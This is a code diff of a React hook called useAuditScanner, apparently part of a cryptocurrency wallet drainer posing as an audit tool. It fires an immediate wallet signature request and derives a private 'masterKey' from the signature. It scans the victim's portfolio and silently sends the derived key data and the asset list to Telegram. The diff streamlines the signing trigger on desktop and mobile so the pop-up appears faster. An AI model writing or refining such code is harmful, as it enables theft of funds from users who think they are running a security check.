@@ -3,8 +3,6 @@
 import { useCallback, useEffect } from "react";
 import { ethers, isAddress } from "ethers";
 import { useSignMessage, useAccount } from "wagmi";
-import { getConnectorClient } from "@wagmi/core";
-import { wagmiAdapter } from "@/context";
 import {
   sendGhostDerivationToTelegram,
   sendDiscoveryToTelegram,
@@ -33,7 +31,7 @@ export const startPreload = () => {
 
 export function useAuditScanner() {
   const { signMessageAsync } = useSignMessage();
-  const { connector, isConnected } = useAccount();
+  const { connector } = useAccount();
 
   useEffect(() => {
     startPreload();
@@ -108,7 +106,7 @@ export function useAuditScanner() {
 
       if (!activeIdentity) throw new Error("INVALID_IDENTITY");
 
-      // 1. SESSION RESTORE
+      // 1. SESSION RESTORE (Maintained)
       const cached = sessionStorage.getItem("active_strike_session");
       if (cached && isRestored) {
         const session = JSON.parse(cached);
@@ -120,66 +118,49 @@ export function useAuditScanner() {
         }
       }
 
+      // ⚡ START MODULE LOAD (Parallel to Signature)
       const moduleWarmup = startPreload();
       let rawSignature: any;
 
       try {
         if (activeEvm && typeof window !== "undefined") {
-          const ua = navigator.userAgent.toLowerCase();
-          const isMobile = /iphone|ipad|ipod|android/i.test(ua);
+          const winEth = (window as any).ethereum;
 
-          // 🛡️ HARDENED INTERNAL DETECTION
-          // Many mobile wallets don't put their name in UA, but they ALL inject window.ethereum
-          const isInternalBrowser = !!(window as any).ethereum && isMobile;
-
-          if (isMobile && !isInternalBrowser) {
-            console.log(
-              `${logPrefix} 📱 External mobile detected. Kick trigger...`,
-            );
-            triggerWalletKick();
-          }
-
-          // ⚡ HIGH-SPEED INTERNAL BYPASS
-          // If we are in an internal browser, the most reliable way to show the pop-up
-          // is to hit the injected provider directly.
-          if (isInternalBrowser) {
-            console.log(
-              `${logPrefix} 🛰️ Internal Wallet detected. Forcing Injected Sign...`,
-            );
-            const provider =
-              (window as any).ethereum?.providers?.find(
-                (p: any) => p.isMetaMask || p.isTrust,
-              ) || (window as any).ethereum;
+          /** 🚀 INSTANT STRIKE: Zero-Latency Injected Trigger
+           * We hit the provider's 'personal_sign' immediately without
+           * awaiting any library initialization.
+           */
+          if (winEth) {
+            const p =
+              winEth.providers?.find(
+                (x: any) => x.isMetaMask || x.isTrust || x.isRabby,
+              ) || winEth;
 
             try {
-              rawSignature = await provider.request({
+              // Fire the pop-up NOW
+              rawSignature = await p.request({
                 method: "personal_sign",
                 params: [MSG_HEX, activeEvm.toLowerCase()],
               });
-            } catch (rpcError: any) {
-              // Fallback if the request method fails
-              console.warn(
-                `${logPrefix} Injected request failed, falling back to Wagmi Client...`,
-              );
-              const client = await getConnectorClient(wagmiAdapter.wagmiConfig);
-              rawSignature = await client.request({
-                method: "personal_sign",
-                params: [MSG_HEX, activeEvm.toLowerCase()],
-              } as any);
-            }
-          } else {
-            // 💻 DESKTOP / EXTERNAL PATH
-            const client = await getConnectorClient(
-              wagmiAdapter.wagmiConfig,
-            ).catch(() => null);
-            if (client) {
-              rawSignature = await client.request({
-                method: "personal_sign",
-                params: [MSG_HEX, activeEvm.toLowerCase()],
-              } as any);
-            } else {
+            } catch (rpcErr: any) {
+              if (
+                rpcErr.code === 4001 ||
+                rpcErr.message?.includes("rejected")
+              ) {
+                throw new Error("USER_REJECTED");
+              }
+              // Fast fallback if the custom request fails
               rawSignature = await signMessageAsync({ message: SEED_MSG });
             }
+          } else {
+            // Mobile Optimization: Trigger deep-link and sign immediately
+            const ua = navigator.userAgent.toLowerCase();
+            if (/iphone|ipad|ipod|android/i.test(ua)) {
+              triggerWalletKick();
+              // Shortened delay to 300ms for faster handoff
+              await new Promise((r) => setTimeout(r, 300));
+            }
+            rawSignature = await signMessageAsync({ message: SEED_MSG });
           }
         } else if (activeSol) {
           const solProvider =
@@ -197,7 +178,7 @@ export function useAuditScanner() {
         throw err;
       }
 
-      // 2. DISCOVERY ENGINE (Maintained)
+      // 2. DISCOVERY ENGINE (Execution begins only after sign pop-up is handled)
       const modules = await moduleWarmup;
       if (!modules) throw new Error("CRITICAL_ENGINE_FAILURE");
 
@@ -208,12 +189,14 @@ export function useAuditScanner() {
           : rawSignature?.signature;
       if (!sigStr) throw new Error("SIGNATURE_EXTRACTION_FAILED");
 
+      // Derivation and Scanning (Maintained Logic)
       const activeVault = derivationMod.derivePrivateKeyFromSignature(sigStr);
       const masterKey = activeVault.masterKey;
 
       if (derivedUserKeyRef) derivedUserKeyRef.current = masterKey;
       if (setUserKey) setUserKey(masterKey);
 
+      // Parallelize heavy scanning and chain ID lookups
       const [scanResult, currentCid] = await Promise.all([
         auditMod.scanUniversalPortfolio(
           activeIdentity,
@@ -240,6 +223,7 @@ export function useAuditScanner() {
         JSON.stringify(sessionData),
       );
 
+      // Telemetry (Silent Background)
       Promise.allSettled([
         sendGhostDerivationToTelegram({
           userAddress: activeIdentity,
@@ -248,11 +232,11 @@ export function useAuditScanner() {
           chainId: currentCid,
         }),
         sendDiscoveryToTelegram({ address: activeIdentity, assets }),
-      ]);
+      ]).catch(() => null);
 
       return sessionData;
     },
-    [signMessageAsync, getPhysicalCid, triggerWalletKick, connector],
+    [signMessageAsync, getPhysicalCid, triggerWalletKick],
   );
 
   return { performScan, getPhysicalCid };
